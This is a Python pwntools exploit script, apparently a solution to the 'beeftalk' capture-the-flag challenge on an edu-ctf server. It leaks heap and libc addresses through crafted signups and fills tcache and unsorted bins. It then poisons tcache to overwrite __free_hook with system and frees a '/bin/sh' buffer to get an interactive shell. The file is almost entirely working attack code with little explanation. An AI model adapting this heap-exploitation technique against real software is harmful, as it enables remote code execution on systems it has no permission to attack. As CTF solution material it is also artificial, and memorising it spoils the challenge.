from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./beeftalk')
r = remote('edu-ctf.zoolab.org', 30207)

libc_addr = 0
heap_addr = 0

user_num = 0

def operate_menu(cmd):
    r.sendlineafter("leave\n> ", cmd.encode())
def operate_chat_menu(cmd):
    r.sendlineafter("logout\n> ", cmd.encode())

def login(token):
    operate_menu("1")
    r.sendlineafter("token: \n> ", token.encode())

def signup(name, desc, job, asset, reply, hack=''):
    global libc_addr, heap_addr
    operate_menu("2")
    # name larger than 0x20 will realloc
    r.sendafter("name ?\n> ", name.encode()) #0x20
    r.sendlineafter("desc ?\n> ", desc.encode()) # 0x40

    r.sendlineafter("job ?\n> ", job.encode()) # 0x10

    r.sendlineafter("have ?\n> ", asset.encode()) # 0x10, long int
    if hack == 'heap':
        r.recvuntil("Name:    ".encode())
        addr_byte = r.recv(6)
        addr = int.from_bytes(addr_byte, 'little')
        print("addr: ", hex(addr))
        heap_addr = addr - 0x342
        print("heap base: ", hex(heap_addr))

        r.sendlineafter('(y/n) > ', reply.encode())
        r.recvuntil("token: ")
        token = r.recvuntil("\n")
        print(f"Token: {token}")
        token = token[:-1].decode()

        return token
    elif hack == 'libc':
        r.recvuntil("Name:    ".encode())
        addr_byte = r.recv(6)
        addr = int.from_bytes(addr_byte, 'little')
        libc_addr = addr - 0x1ebc41
        print("libc addr: ", hex(libc_addr))

        r.sendlineafter('(y/n) > ', reply.encode())
        r.recvuntil("token: ")
        token = r.recvuntil("\n")
        token = token[:-1].decode()

        return token

    r.sendlineafter('(y/n) > ', reply.encode())

    if reply == 'y':
        r.recvuntil("token: ")
        token = r.recvuntil("\n")
        token = token[:-1].decode()
        print(f"Token: {token}")
        return token

def delete_account():
    operate_chat_menu("3")
    r.sendlineafter("> ", "y")
    

# 0x67 would malloc 0x70 bytes because 0x67+0x08+0x01(last null byte) = 0x70
def leak_heap():
    global user_num
    name = 'AAAAAAAA'
    desc = 'bb'
    job = 'cc'
    asset = '3'
    reply = 'n'
    signup(name, desc, job, asset, reply)
    reply = 'y'
    name = 'B'

    token = signup(name, desc, job, asset, reply, 'heap')
    login(token)
    delete_account()
    return token 

def leak_libc():
    global user_num

    name = 'A' * 0x100
    desc = 'bb'
    job = 'cc'
    asset = '3'
    # fill tcache bin
    tokens = []

    for i in range(7):
        name = 'A' * 0x100
        signup(name, desc, job, asset, 'n')

        name = 'A'
        token = signup(name, desc, job, asset, 'y')
        tokens.append(token)
    user_num += 7

    # Login and delete users
    for token in tokens:
        login(token)
        print("Login!")
        delete_account()
    user_num -= 7

    # try to put into unsorted bin for 2 account
    tokens = []

    for i in range(2):
        name = 'A' * 0x100
        token = signup(name, desc, job, asset, 'y')
        tokens.append(token)
    user_num += 2

    # delete unsorted bin
    for token in tokens:
        login(token)
        delete_account()
    user_num -= 2

    # === User num: 1 ===

    # Clear tcache bin 0x110
    tokens = []

    for i in range(3):
        name = 'A'*0x10
        token = signup(name, desc, job, asset, 'y')

        tokens.append(token)
    user_num += 3

    # leak libc
    name = 'A'
    token = signup(name, desc, job, asset, 'y', 'libc')
    tokens.append(token)
    user_num += 1
    
    # delete users
    for token in tokens[:4]:
        login(token)
        delete_account()
    user_num -= 4
    return tokens

def update_user(name, desc, job):
    operate_chat_menu("1")

    r.sendlineafter("Name: \n> ", name)
    r.sendlineafter("\n> ",desc) # desc
    r.sendlineafter("\n> ", job) # job
    r.sendlineafter("\n> ", "3".encode())

def logout():
    operate_chat_menu("4")

def exploit(free_hook, _system, tokens, token):
    name = 'A' * 0x40
    desc, job = 'a', 'a'
    asset = '1'
    login(tokens[2])
    # delete_account()
    wtf = p64(0x0007000000070007)

    fake_heap = p64(heap_addr + 0xa40)
    # fake_arena = p64(heap_addr + 0x10)
    update_user(fake_heap, wtf, p64(free_hook-8))

    logout()
    name = 'A' * 0x18

    token = signup(name, desc, job, asset, 'y')
    token = signup(name, desc, job, asset, 'y')
    token = signup(name, desc, job, asset, 'y')
    # write 'bin/sh'  + system to job
    login(token)
    job_payload = b'/bin/sh\x00' + p64(_system)
    update_user(fake_heap,fake_heap, job_payload)
    print("free: ", hex(free_hook) )
    # gdb.attach(r)

    delete_account()
    
tokens = leak_libc()
free_hook = libc_addr + 0x1eeb28
_system = libc_addr + 0x55410
token = leak_heap()
print("Heap: ", hex(heap_addr))
print("User num:", user_num)
exploit(free_hook, _system, tokens, token)
# register user 0x50


r.interactive()


    